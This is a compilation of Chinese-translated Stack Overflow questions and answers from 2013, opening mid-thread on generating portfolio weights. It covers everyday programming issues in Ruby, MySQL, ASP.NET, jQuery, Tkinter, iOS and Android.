[< 0.0 , 1.0 > , < 0.01 , 0.99 > , < 0.02 , 0.98 > , < 0.03 , 0.97 > , < 0.04 , 0.96 > , < 0.05 , 0.95 > , < 0.06 , 0.94 > , < 0.07 , 0.9299999999999999 > , < 0.08 , 0.92 > , < 0.09 , 0.91 > , < 0.1 , 0.9 > , < 0.11 , 0.89 > , < 0.12 , 0.88 > , < 0.13 , 0.87 > , < 0.14 , 0.86 > , < 0.15 , 0.85 > , < 0.16 , 0.84 > , < 0.17 , 0.83 > , < 0.18 , 0.8200000000000001 > , < 0.19 , 0.81 > , < 0.2 , 0.8 > , < 0.21 , 0.79 > , < 0.22 , 0.78 > , < 0.23 , 0.77 > , < 0.24 , 0.76 > , < 0.25 , 0.75 > , < 0.26 , 0.74 > , < 0.27 , 0.73 > , < 0.28 , 0.72 > , < 0.29 , 0.71 > , < 0.3 , 0.7 > , < 0.31 , 0.69 > , < 0.32 , 0.6799999999999999 > , < 0.33 , 0.6699999999999999 > , < 0.34 , 0.6599999999999999 > , < 0.35000000000000003 , 0.6499999999999999 > , < 0.36 , 0.64 > , < 0.37 , 0.63 > , < 0.38 , 0.62 > , < 0.39 , 0.61 > , < 0.4 , 0.6 > , < 0.41000000000000003 , 0.59 > , < 0.42 , 0.5800000000000001 > , < 0.43 , 0.5700000000000001 > , < 0.44 , 0.56 > , < 0.45 , 0.55 > , < 0.46 , 0.54 > , < 0.47000000000000003 , 0.53 > , < 0.48 , 0.52 > , < 0.49 , 0.51 > , < 0.5 , 0.5 > , < 0.51 , 0.49 > , < 0.52 , 0.48 > , < 0.53 , 0.47 > , < 0.54 , 0.45999999999999996 > , < 0.55 , 0.44999999999999996 > , < 0.56 , 0.43999999999999995 > , < 0.5700000000000001 , 0.42999999999999994 > , < 0.58 , 0.42000000000000004 > , < 0.59 , 0.41000000000000003 > , < 0.6 , 0.4 > , < 0.61 , 0.39 > , < 0.62 , 0.38 > , < 0.63 , 0.37 > , < 0.64 , 0.36 > , < 0.65 , 0.35 > , < 0.66 , 0.33999999999999997 > , < 0.67 , 0.32999999999999996 > , < 0.68 , 0.31999999999999995 > , < 0.6900000000000001 , 0.30999999999999994 > , < 0.7000000000000001 , 0.29999999999999993 > , < 0.71 , 0.29000000000000004 > , < 0.72 , 0.28 > , < 0.73 , 0.27 > , < 0.74 , 0.26 > , < 0.75 , 0.25 > , < 0.76 , 0.24 > , < 0.77 , 0.22999999999999998 > , < 0.78 , 0.21999999999999997 > , < 0.79 , 0.20999999999999996 > , < 0.8 , 0.19999999999999996 > , < 0.81 , 0.18999999999999995 > , < 0.8200000000000001 , 0.17999999999999994 > , < 0.8300000000000001 , 0.16999999999999993 > , < 0.84 , 0.16000000000000003 > , < 0.85 , 0.15000000000000002 > , < 0.86 , 0.14 > , < 0.87 , 0.13 > , < 0.88 , 0.12 > , < 0.89 , 0.10999999999999999 > , < 0.9 , 0.09999999999999998 > , < 0.91 , 0.08999999999999997 > , < 0.92 , 0.07999999999999996 > , < 0.93 , 0.06999999999999995 > , < 0.9400000000000001 , 0.05999999999999994 > , < 0.9500000000000001 , 0.04999999999999993 > , < 0.96 , 0.040000000000000036 > , < 0.97 , 0.030000000000000027 > , < 0.98 , 0.020000000000000018 > , < 0.99 , 0.010000000000000009 > , < 1.0 , 0.0 > ] 
```

但是，我不确定如何将其扩展到`N weights`.

有人可以帮忙吗？

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-06-05T00:23:53.003

在我发布问题几周后我想出了一些解决方案后，我完全忘记了这篇文章。今天早些时候在 R 上发帖后才再次注意到它。以下解决方案基于我在发布问题以寻求建议之前所做的尝试。

本质上，有多种方法可以构建一组 N>3 权重。效果最好的是：

方法 1：如果 N 很大，则耗时

1：定义一个长度为 N 的临时双精度数组 2：定义一个 LinkHashSet 或其他 HashMap 来收集临时数组 3：生成 0 到 1 之间的连续随机数并填充在步骤 1 中创建的临时数组并插入到数组的连续元素中确保每个连续的权重 (x) 满足条件 x(i) < (1-sum(x(0,....i-1)) 和 sum(x(0,....i)<1 4：其中数组元素总和为 1（即 sum(x(0,....i)=1) 将数组添加到步骤 2 中定义的 LinkHashSet/HashMap，并使用一些索引键 int 确保检查没有LinkHashSet 中已经存在其他数组，其元素中的值具有相同的排列 5：重复直到生成了足够多的权重集

方法 2：人口规模不太准确，但比方法 1 快

1：设置为可被 3 或 4 整除，并定义一个 LinkHashSet/HashMap 来存储权重和 ArrayList 以方便生成权重 2：定义 3 或 4 个资产的权重。对于普通人脑来说，绕过存储在 ArrayList 3 中是相当直接的：现在将 4 个计算权重中的每一个视为一类资产，其中在步骤 2 中计算权重 x 并生成另一组 3 或 4 个权重并相乘每个新权重按步骤 2 中的权重，并酌情添加或更新 ArrayList 4：使用上一轮步骤 3 中 ArrayList 中更新的权重，对 ArrayList 的每个元素重复步骤 3，直到 ArrayList 的大小为 N 5：将 ArrayList 存储在带有索引键的 LinkHashSet/HashMap 中，以便于调用

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-02-13T06:33:54.833

我在这类事情上没有任何经验，但我认为如果你使用 enamurations 你可以克服这个问题。但我不确定:)

# php - HTML5 画布 - 将保存的图像分享到社交媒体

> ID：14847757
> 
> 赞同：6
> 
> 时间：2013-02-13T06:28:36.850
> 
> 标签：php, javascript, html, canvas, fabricjs

感谢您花时间阅读这篇文章。

我在这个论坛上浏览了无数的帖子，但仍然无法实现我所追求的。

我创建了一个 html5 画布来保存用户的绘图和图像。当用户按下发布时，他/她将被提示一个弹出框（灯箱）预览她的图像，并可以选择使用[Addthis.com 在社交网络上共享图像。](http://addthis.com)

这是我迄今为止所取得的成就。1\. 在我的画布中，我有一个名为 #btnPreview 的按钮

```
$("#btnPreview").click(function (event) {
    canvas.deactivateAll();
    var strDataURI = canvas.toDataURL("png");
    var proporcao = 1;
    var proporcaoW = 500 / canvas.width;
    var proporcaoH = 400 / canvas.height;
    if (proporcaoW < proporcaoH) {
        proporcao = proporcaoW;
    } else {
        proporcao = proporcaoH;
    }
    $("#addthis_shareable").width(canvas.width * proporcao).height(canvas.height * proporcao).attr("src", strDataURI);
    //  $("#imgPreview").width(canvas.width*proporcao).height(canvas.height*proporcao).attr("src", strDataURI);
    $("#modalPreview").modal("show");
}); 
```

这会打开一个灯箱弹出窗口。

2.  当我尝试在 facebook、twitter 等上分享带有描述的图像时，图像被存储在`<img id"imgPreview" src"data:image/png;base64,....">` 它不起作用。

我知道这是什么问题，但无法创建此任务所需的 javascript 和 php 脚本。

我想要实现的是向这个论坛询问这个概念的最佳实践。

我的想法是创建一个 save.Php 脚本来保存 .png 文件而不在服务器上提示或`www.example.com/image.png`在我按下时 创建一个假 url`#btnPreview`

一旦弹出窗口加载我的 img url 将是

```
<img id"imgPreview" src"www.example.com/images/md5_timestamp.png"> 
```

这是我找到的封闭示例
[示例 1 导致示例 2](https://stackoverflow.com/questions/12902190/how-to-save-and-share-canvas-html5-image-by-saving-as-link)
[示例 2 保存 base64](https://stackoverflow.com/questions/11511511/how-to-save-a-png-image-server-side-from-a-base64-data-string)
[示例 3 将画布保存为 JPG 或 PNG](https://stackoverflow.com/questions/11206955/saving-canvas-as-a-png-or-jpg)
[示例 4 非常接近之后的内容 - 底部答案](https://stackoverflow.com/questions/13198131/how-to-save-a-html5-canvas-as-image-on-a-server)

我希望我解释正确。

期待您的回复。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-13T15:03:06.830

检查这个： [Fabric.js canvas.toDataURL() 通过 Ajax 发送到 PHP](https://stackoverflow.com/questions/9771986/fabric-js-canvas-todataurl-sent-to-php-by-ajax/) 如您所见，您可以发送画布的 PNG base64 数据并在服务器端用 PHP 生成图像。这是您可以在服务器端的 PHP 中使用的代码： [https ://gist.github.com/rodrigopandini/2149853](https://gist.github.com/rodrigopandini/2149853)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-13T06:50:14.770

可能有两种情况：

1.  为了能够将照片/帖子 URL 分享到 Facebook，您需要先将照片保存到您的服务器（或至少从您的应用程序提供）
2.  如果您希望将其作为图像 ( photo ) 发布到 Facebook，您需要创建一个 OAuth2.0 流程，以便您的应用程序代表用户将照片发布到 Facebook。

# ruby - 从索引到字符串结尾的子字符串的Ruby成语

> ID：14847760
> 
> 赞同：43
> 
> 时间：2013-02-13T06:28:48.757
> 
> 标签：ruby, string, substring, slice, idioms

只是想知道是否有一个 Ruby 习惯用法用于从索引中提取子字符串直到字符串结尾。我知道`str[index..-1]`通过将一个范围对象传递给`String`'`[]`方法可以工作，但它有点笨拙。例如，在 python 中，您可以编写`str[index:]`which 会隐式地为您获取字符串的其余部分。

例子：

```
s = "hello world"
s[6..-1] # <-- "world" 
```

有什么比 更好的`s[6..-1]`吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2019-06-28T15:03:37.140

Ruby 2.6 引入了[无限范围](https://ruby-doc.org/core-2.6/Range.html#class-Range-label-Endless+Ranges)，这基本上消除了必须指定结束索引的需要。在您的情况下，您可以执行以下操作：

```
s = "hello world"
s[6..] 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-02-13T06:37:20.060

我认为不是。

似乎这`Range`是更好的方法。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2013-02-13T06:55:34.803

如果你愿意，这里是“更好的”。您可以扩展 ruby​​ String 类，然后在您的代码中使用此方法。例如：

```
class String
  def last num
    self[-num..-1]
  end
end 
```

进而：

```
s = "hello world"
p s.last(6) 
```

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2016-09-16T15:05:33.543

要从范围中获取字符串：

```
s = 'hello world'
s[5..s.length - 1] # world 
```

但是，如果您只想获得最后一句话：

```
'hello world'.split(' ').last # world 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-02-13T06:55:52.670

您可以扩展`String`类。不确定它是否是红宝石成语：

```
class String
  def last(n)
    self[(self.length - n)..-1]
  end
end 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2018-09-28T21:21:34.637

Rails 的`activesupport`库（可以作为独立于 Rails 的 gem 安装）`from`为字符串添加了一个方法：

```
> s = "hello world"
"hello world"
> s.from(6)
"world" 
```

[https://api.rubyonrails.org/classes/String.html#method-i-from](https://api.rubyonrails.org/classes/String.html#method-i-from)

# asp.net - 在gridview中从emptydatatemplate中查找控件

> ID：14847761
> 
> 赞同：1
> 
> 时间：2013-02-13T06:28:49.633
> 
> 标签：asp.net, gridview

我正在使用 EmptyDataTemplate 在网格中输入新数据，而没有现有数据，但我无法在 EmptyDateTemplate 中找到我的控件

```
protected void gvNavigationDtls_RowCommand(object sender, GridViewCommandEventArgs e)
    {
        if (e.CommandName.Equals("EInsert"))
        {
            GridViewRow emptyrow = gvNavigationDtls.Controls[0].Controls[0] as GridViewRow;
            if (((TextBox)emptyrow.FindControl("txtCode")).Text == "") 
```

在页面加载中，我还通过编写以下代码进行了检查

```
gvNavigationDtls.DataBind();
            Control c = gvNavigationDtls.Controls[0].FindControl("txtCode");
            if (c != null)
            {
            } 
```

但 c 为空，这意味着我无法找到使用它的控件，请帮助，在此先感谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-09-05T18:27:40.107

```
protected void gvNavigationDtls_RowCommand(object sender, GridViewCommandEventArgs e)
    {
        if (e.CommandName.Equals("EInsert"))
        {
          TextBox txtCode=(TextBox)gvNavigationDtls.Controls[0].Controls[0].FindControl("txtCode");
          txtCode.Text="Your value";
        }
     } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-06-10T11:38:35.610

实际上，刚刚遇到了这个问题，很容易找到访问数据，但它在 RowDataBound 事件中。

```
 Protected Sub grdView(sender As Object, e As GridViewRowEventArgs) Handles grdView.RowDataBound
        If e.Row.RowType = DataControlRowType.EmptyDataRow Then
            Dim txt As TextBox = e.Row.FindControl("txtBox")
            txt.Text = "Hey, this works!"
        End If
    End Sub 
```

# mysql - 不在使用 MySQL 的特定表中

> ID：14847762
> 
> 赞同：2
> 
> 时间：2013-02-13T06:28:59.983
> 
> 标签：mysql, sql, join

我有两张桌子：

1.  一个持有我成员的所有帖子，并且

2.  另一个持有帖子的 id，用户 id 将帖子隐藏在他们的页面上

我如何选择所有帖子，除了那些不在隐藏表中的帖子？

伪语句示例...

> “SELECT * FROM posts WHERE NOT IN（其他表）”

这是我到目前为止所拥有的

```
SELECT * FROM `acmPosting` LEFT JOIN `hidePosts` ON acmPosting.id = hidePosts.postID WHERE `sender`='$userID' OR `recip`='$userID' OR `sender` IN ($friendsArray) OR `recip` IN ($teamsArray) AND hp.id IS NULL ORDER BY `timeSent` DESC LIMIT 10 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-13T06:32:02.213

假设第二个表是 postHides，并且两个表都有一个 postId 列：

```
SELECT * FROM posts WHERE postId NOT IN (SELECT postId FROM postHides) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-13T06:33:29.863

```
SELECT post.* FROM post LEFT JOIN foo ON post.id = foo.post_id WHERE foo.post_id IS NULL 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-02-13T06:33:30.483

这称为反连接，应该等效于使用`NOT IN`（尽管使用不同的查询计划）：

```
SELECT *
FROM posts p
LEFT JOIN hiddenPosts hp on hp.id = p.id
WHERE hp.id IS NULL
; 
```

有关更多信息，请参阅本文：[NOT IN vs. NOT EXISTS vs. LEFT JOIN / IS NULL](http://explainextended.com/2009/09/18/not-in-vs-not-exists-vs-left-join-is-null-mysql/)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-02-13T06:39:09.447

假设另一个表被命名`hide_list`并且其中的外*键*是`posts.id`。`fk_post_id`然后选择语句将是：

```
SELECT posts.* from posts,hide_list WHERE NOT posts.id=hide_list.fk_post_id; 
```

更优化的解决方案将是：

```
SELECT posts.* from posts,(SELECT fk_post_id from hide_list) hide_list WHERE NOT posts.id=hide_list.fk_post_id; 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-02-13T06:42:28.113

```
"SELECT * FROM posts WHERE post_id NOT IN (select post_id from other_table)" 
```

# xcode4.6 - 语义问题未使用的参数“格式”警告xcode 4.6

> ID：14847772
> 
> 赞同：0
> 
> 时间：2013-02-13T06:29:41.863
> 
> 标签：xcode4.6

在 .m 文件中，我收到此警告不是错误

语义问题未使用的参数“格式”

在 xcode4.6 中打开此文件后，在此 .m 文件中作为未使用的参数获取

```
+ (ParsedResult *)parsedResultForString:(NSString *)s
                                 format:(BarcodeFormat)format 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T06:00:42.673

此警告意味着该参数`format`从未在您的函数中使用。要消除该警告，您可以执行以下操作之一。

a）`#pragma`在某些函数中添加特殊以抑制警告，只需将其放在您的函数实现下方，即：

```
+ (ParsedResult *)parsedResultForString:(NSString *)s
                             format:(BarcodeFormat)format
{
    #pragma unused (format)
    // ... your code here ... 
```

b) 在项目中全局关闭此警告。转到您的项目设置或目标设置 => `Build Settings`=> `Apple LLVM Compiler 4.2 - Warnings - All languages`=> `Unused Parameters`，将其设置为`No`.

# asp.net - 为什么 IE8+ 中不出现水晶报表 Activex 打印对话框？

> ID：14847776
> 
> 赞同：1
> 
> 时间：2013-02-13T06:30:00.873
> 
> 标签：asp.net, visual-studio-2008, crystal-reports

我使用水晶报表设计了报表，并将`PrintMode`属性设置为`activex`. 但是当我按下打印按钮时，会出现一个弹出窗口，但它是空的。我只是在 IE8+ 中遇到了这个问题。怎么了？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T14:44:30.567

您需要在客户端以管理员身份安装 printControl.cab。你可以在[这里找到](http://support.businessobjects.com/CRforVS2008/PrintControl.cab)

这是一个允许您打印的 activex 控件。出于这个原因，我选择使用 pdf 模式。如果这不起作用，请尝试 IE 中的兼容模式按钮。

请向我们更新您的结果。

# clojure - 在 VimClojure 中禁用窗口重新定位？

> ID：14847782
> 
> 赞同：0
> 
> 时间：2013-02-13T06:30:20.803
> 
> 标签：clojure, vim, vimclojure

我正在使用[VimClojure](https://github.com/vim-scripts/VimClojure)插件。有时当我使用`o`插入新行时，插件会重新定位窗口并将当前行移动到窗口底部。这很烦人，尤其是当我输入`zz`以使当前行居中时。

我已阅读[文档](https://github.com/vim-scripts/VimClojure/blob/master/doc/clojure.txt)但没有发现任何相关内容，有人可以告诉我如何禁用此功能吗？

编辑：感谢 Ingo Karkat 的建议，[切换到 foreplay.vim](http://clojure-doc.org/articles/tutorials/vim_foreplay.html)将解决这个问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T07:49:12.527

我不使用*VimClojure*，但这听起来像是插件中的错误，而不是功能。可能，一些`winsaveview()`/`winrestview()`丢失了。我会把这个问题提交给作者。

# javascript - 在鼠标悬停时显示 div 对象？

> ID：14847787
> 
> 赞同：0
> 
> 时间：2013-02-13T06:30:35.773
> 
> 标签：javascript

我正在尝试制作一个 JavaScript 函数来说明标注 div 和缺口 div 是隐藏的，但是当鼠标悬停在 contact_details_email 上时会淡入标注和缺口，然后在鼠标上退出 contact_details_email 会淡出标注和缺口。

我是 JavaScript 新手，有人可以告诉我我需要做什么吗？

```
<script>
     $(".callout").hide();
     $(".notch").hide();
        $('.contact_details_email').onMouseOver(function(){

                $('.callout').fadeIn(500);
                 $('.notch').fadeIn(500);

        });
    </script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T09:33:56.837

我希望 [该链接](https://stackoverflow.com/questions/1151676/preventing-mouseout-event-for-child-node#answer-1153476)对您有用，并且对[jquery 文档有帮助](http://api.jquery.com/mouseover/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T06:37:20.650

jQuery 的 mouseover 事件的一般格式如下（根据您可以在[http://api.jquery.com/hover/找到的优秀文档](http://api.jquery.com/hover/)

```
$(selector).hover(function(){
    //mouseover handler
}, function(){
    //mouseout handler
}) 
```

假设 .callout 和 .notch 是 .contact_details_email 的后代......

```
$('.contact_details_email').hover(function(){
    //mouseover handler
    $(this).find('.callout').fadeIn(500);
    $(this).find('.notch').fadeIn(500);
}, function(){
    //mouseout handler
    $(this).find('.callout').fadeOut(500);
    $(this).find('.notch').fadeOut(500);
}); 
```

# iphone - 有没有办法以编程方式从 iPhone 收件箱中删除短信？

> ID：14847788
> 
> 赞同：1
> 
> 时间：2013-02-13T06:30:46.610
> 
> 标签：iphone, objective-c, jailbreak

我的 iPhone 已越狱，我不必将应用程序提交到 App Store。所以任何解决方案都可以。我只想知道是否有办法以编程方式从 iPhone 收件箱中删除包含特定字符串的短信？

```
setuid(0);

sqlite3 *database;

NSString *path = @"/var/mobile/Library/SMS/sms.db";

sqlite3_open([path UTF8String], &database);

NSString *deleteStatement = @"delete from message";

char *error;
sqlite3_exec(database, [deleteStatement UTF8String], NULL, NULL, &error) ;

sqlite3_close(database); 
```

这是我的代码。主要方法里写的。我的代码中没有其他内容。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T12:55:26.420

您还必须注意触发器。

您可以使用以下方式删除它：

```
drop trigger if exists delete_message; 
```

然后您可以继续消除这些消息。之后，您应该重新创建触发器：

```
CREATE TRIGGER if not exists delete_message AFTER DELETE ON message WHEN NOT read(old.flags) 
```

无论如何，一般来说，您可以看一下与您的问题非常相似的另一个问题：[delete message on sqlite。越狱 iPhone](https://stackoverflow.com/questions/14434735/delete-message-on-sqlite-jailbreak-iphone)

# macos - 完全卸载两个postgresql mac（系统上的brew安装）

> ID：14847791
> 
> 赞同：0
> 
> 时间：2013-02-13T06:30:56.987
> 
> 标签：macos, osx-lion, uninstallation, homebrew

自从我尝试在我的 mac 上安装 psql 以来，我遇到了很多问题。我怀疑系统 psql 是原因。我想对 psql 的 mac clean 重新进行一次重试。这篇文章帮助我开始[从 Mac OSX Lion 中完全卸载 PostgreSQL 9.0.4？](https://stackoverflow.com/questions/8037729/completely-uninstall-postgresql-9-0-4-from-mac-osx-lion)，但我找不到系统上 psql 的卸载。另外，我可能有打开的服务器，我如何验证这些服务器都没有打开？

# iphone - SUP 搜索两个日期之间的数据

> ID：14847795
> 
> 赞同：1
> 
> 时间：2013-02-13T06:31:27.407
> 
> 标签：iphone, date, search, sup

我正在使用 Sybase 无线平台创建一个 iPhone 应用程序。在我的应用程序中，我有一个屏幕可以根据“从”和“到”日期、采购订单号和用户名搜索采购订单。用户名是隐式输入的。如果我只给用户名应用程序读取该用户的所有采购订单（采购订单号）。我的问题是当我单独输入起始日期和截止日期时，应用程序第一次读取所有采购订单号。但第二次应用程序读取日期内的实际采购订单号.我确信即使在第一次同步之前，我的用户名、从日期和到日期的个性化参数也会被清除。我在这里找不到问题所在。在登录屏幕中，我使用此用户名登录应用程序。但登录后我清除了用户名的个性化参数。

我是 SUP 新手 任何帮助都是可观的

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-04T08:12:25.450

我猜你是在调用同步方法之后为日期设置个性化密钥，因此在下一次同步中你可以根据起始日期和截止日期获取数据。

# python - 在循环中获取每个条目的内容

> ID：14847803
> 
> 赞同：0
> 
> 时间：2013-02-13T06:31:58.070
> 
> 标签：python, tkinter, printing, tkinter-entry

我使用 tkinter 和 Python 从用户那里获取查询并在循环中打印每个条目的内容。但是，仅打印最后一个条目的文本。我应该怎么做才能解决问题？

```
for i in range(len(labels)):
    label=Label(V,text=i, relief=RIDGE,width=8)
    label.pack()
    label.grid(row=counter,column=1,padx=5,pady=5)
    entry = Entry(V, relief=SUNKEN,width=30,justify=RIGHT)
    entry.pack()
    entry.grid(row=counter,column=0,padx=10,pady=5)
    def showevent (event):
        print entry.get()

    entry.bind("<Return>", showevent) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T06:33:29.217

这是对闭包的常见误解。基本上，在函数*运行*`entry`时查找，而不是定义。简单的解决方法是使其成为默认参数：

 *```
def showevent(event,entry=entry):
    print entry.get() 
```

这是有效的，因为默认参数是在创建函数时评估的，而不是在调用它时，所以你总是得到你想要的条目。*

# windows-phone-8 - 在 windows phone 8 中以编程方式发送短信，无需用户交互

> ID：14847805
> 
> 赞同：0
> 
> 时间：2013-02-13T06:32:02.173
> 
> 标签：windows-phone-8

是否可以在没有用户交互的情况下在 Windows Phone 8 中以编程方式发送 SMS？我环顾四周，但所有解决方案都希望用户单击发送按钮。我不限于 C#，我考虑的是 C++，但现在我没有任何好的解决方案来解决这个问题。

感谢您的任何建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:52:12.133

不，这是不可能的。您唯一的方法是 SmsComposeTask。

# asp.net - 解析word文档并插入数据库

> ID：14847809
> 
> 赞同：0
> 
> 时间：2013-02-13T06:32:07.923
> 
> 标签：asp.net, c#-4.0

我有一个word文件：

问题 1：问题内容 答案 A： 答案 B： 答案 C： 答案 D：

我想读取这个文件并将数据插入到我的数据库中，例如**问题**1将进入**问题**列，相应的**答案**将进入**答案**列.........

```
string strPath = Server.MapPath("~/Test.doc");
// Request.PhysicalApplicationPath + "\\Test.doc"; 
FileStream fStream = new FileStream (strPath, FileMode.Open, FileAccess.Read); 
StreamReader sReader = new StreamReader(fStream); 
//TextBox2.Text = sReader.ReadToEnd(); 
string data1 = sReader.ReadToEnd(); 
sReader.Close(); 
Response.Write(data1); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T07:11:14.037

尝试这样的事情

```
string strPath = Server.MapPath("~/Test.doc");
using (FileStream fs = new FileStream(strPath, FileMode.Open))
            {
                using (StreamReader reader = new StreamReader(fs, Encoding.UTF8))
                {
                    string line = null;
                    while ((line = reader.ReadLine()) != null)
                    {
                        Console.WriteLine(line);
                        if (line.Contains("question"))
                        {
                            //read content here
                        }
                    }
                }
            } 
```

# php - 查询中的 COUNT() 点赞返回意外结果

> ID：14847812
> 
> 赞同：1
> 
> 时间：2013-02-13T06:32:19.343
> 
> 标签：php, mysql, sql

我正在创建某种社交媒体，例如 facebook，我正在尝试使用以下查询获取帖子的点赞数。

```
SELECT posts.object_ID, posts.user_ID, posts.datetime, posts.text, 
    COUNT(likes.object_ID) AS likes, 
    SUM(IF(likes.user_ID=?, 1, 0)) AS allowLike, users.first_name, 
    users.last_name, userinfo.image_ID 
FROM posts 
LEFT JOIN users ON users.ID=posts.user_ID 
LEFT JOIN friends ON (friends.user_ID_1=? OR friends.user_ID_2=?) 
    AND friends.approved=1 
LEFT JOIN userinfo ON users.ID=userinfo.user_ID 
LEFT JOIN likes ON likes.object_ID=posts.object_ID 
WHERE ". $str ." 
GROUP BY posts.object_ID 
ORDER BY posts.datetime DESC 
LIMIT 0,30 
```

的值`$str`只是一种过滤掉朋友和东西的机制，例如：

```
$str = "(posts.user_ID=friends.user_ID_1 OR posts.user_ID=friends.user_ID_2) OR posts.user_ID=? "; 
```

现在发生的是`COUNT(likes.object_ID)`返回 4 并且也`SUM(IF(likes.user_ID=?, 1, 0))`返回 4。

令人惊讶的是，这是实际喜欢的数量乘以我拥有的朋友数量（4），我假设，因为有 2 个喜欢的帖子显示为 8 个喜欢。昨天我有 3 个朋友，结果显示为 3 个。而且只有当帖子是我自己的时才会发生。

我使用一个非常相似的查询来获取评论，但那里没有发生任何奇怪的事情。

有任何想法吗？

编辑：它不仅限于我自己的帖子。我刚刚在别人的帖子中发现了一个案例。尽管如此，它并没有发生在每个帖子上......这很奇怪。而且，它不受我个人喜好的约束......

EDIT2：在“喜欢”我在 EDIT1 中谈到的帖子后，它显示为一个，经过几次刷新后，它仍然显示为 1。奇怪的..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T10:09:23.887

您的问题可能与您的 WHERE 子句有关。一个参数没有被解析；您的 WHERE 只是一个长 varchar，您的 RDMS 将其解释为 TRUE。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T10:52:38.080

好吧，我决定放弃这一点，只寻求一个类似于我自己和@Duniyadnd 在我的问题评论中描述的解决方案。

I have a table objects. It only contained an ID. I added a field 'likes'. And created two triggers: One for the newLike, and one for a deletedLike which would update the likes column at the given object_ID.

Now my query is as such:

```
SELECT 
    posts.object_ID, posts.user_ID, posts.datetime, posts.text, objects.likes, 
SUM(IF(likes.user_ID=?, 1, 0)) AS allowLike, users.first_name, users.last_name,   
    userinfo.image_ID 
FROM posts 
LEFT JOIN users ON users.ID=posts.user_ID 
LEFT JOIN friends ON (friends.user_ID_1=? OR friends.user_ID_2=?) AND friends.approved=1 
LEFT JOIN userinfo ON users.ID=userinfo.user_ID 
LEFT JOIN objects ON objects.ID=posts.object_ID 
LEFT JOIN likes ON likes.object_ID=posts.object_ID 
WHERE ". $str ." 
GROUP BY posts.object_ID ORDER BY posts.datetime DESC LIMIT 0,30 
```

So I cleared my likes table to start over, yet, allowLike (`SUM(IF(likes.user_ID=?, 1, 0))`) still returns 4\. There is only 1 entry in the likes table, I'm still curious why this is hapenning? Again, I have 4 friends.

Or would I better place this in a new question.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-29T21:43:49.107

The joins are causing multiple intermediate rows to be created from the cross joins of the rows in one table with those of another table. Therefore your 4 friends are causing the 1 like to be turned into 4 intermediate rows, and then it is summed up to get a result of 4.

Instead of all the joins, try using a select within the first select, like this query on posts/comments/likes:

```
select postid, postmessage,
 (select count(commentid) from comment where post.postid = comment.postid) as numcomments,
 (select sum(value) from like where post.postid = like.postid) as popularity
from post
group by postid 
```

(I have like.value as being 1 or -1 as up votes and down votes)

Hope that helps :)

# iphone - 模拟内存警告时，Twitter iOS 5.1 上的应用程序崩溃。

> ID：14847818
> 
> 赞同：1
> 
> 时间：2013-02-13T06:32:57.223
> 
> 标签：iphone, ios5, twitter, objective-c-2.0

```
if ([TWTweetComposeViewController canSendTweet]) {
    // Initialize Tweet Compose View Controller 
TWTweetComposeViewController *vc = [[[TWTweetComposeViewController alloc] init]autorelease];
    // Settin The Initial Text
    [vc setInitialText:status];

    // Setting a Completing Handler
    [vc setCompletionHandler:^(TWTweetComposeViewControllerResult result) {
        if(result == TWTweetComposeViewControllerResultDone) {
                 NSLog(@"Posted ");
        }
    }];     
} else {
    // Show Alert View When The Application Cannot Send Tweets
    NSString *message = @"The application cannot send a tweet at the moment. This is because it cannot reach Twitter or you don't have a Twitter account associated with this device.";
    UIAlertView *alertView = [[UIAlertView alloc] initWithTitle:@"Oops" message:message delegate:nil cancelButtonTitle:@"Dismiss" otherButtonTitles:nil];
    [alertView show];
} 
```

只要没有发生内存警告，代码就可以正常工作，但是当我在设备上模拟内存警告时，它会使应用程序因错误而崩溃。

```
Terminating app due to uncaught exception 'NSRangeException', reason: 'Cannot remove an observer <TWTweetComposeViewController 0xee2dc80> for the key path "contentSize" from <UITextView 0xee3c5e0> because it is not registered as an observer.' 
```

# android - android应用程序中的两级滑动菜单

> ID：14847826
> 
> 赞同：0
> 
> 时间：2013-02-13T06:33:27.940
> 
> 标签：android

我想使用像滑动菜单一样的 facebook，但是有一个菜单和子菜单。如果单击菜单中的任何项目，则必须显示子菜单，并且必须显示父菜单和子菜单。是否有任何可用的库，甚至可以用于 16 以下的 API。我已经搜索了很多实现子菜单，但没有成功。请帮助...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T07:25:05.940

你的问题对我来说不是很清楚。但我的感觉是使用[ActionBarSherlock](http://actionbarsherlock.com/ "动作条夏洛克")并在 xml 中定义左片段和右片段，并在 MainActivity 中使用引用它。

我希望我有所帮助。这是你想要的吗？

# c# - WPF 命令行和 MvvmLight 与 designdata

> ID：14847831
> 
> 赞同：0
> 
> 时间：2013-02-13T06:33:46.760
> 
> 标签：c#, .net, mvvm, command-line, mvvm-light

我想覆盖 OnStartup 就像在这个线程中解释的那样

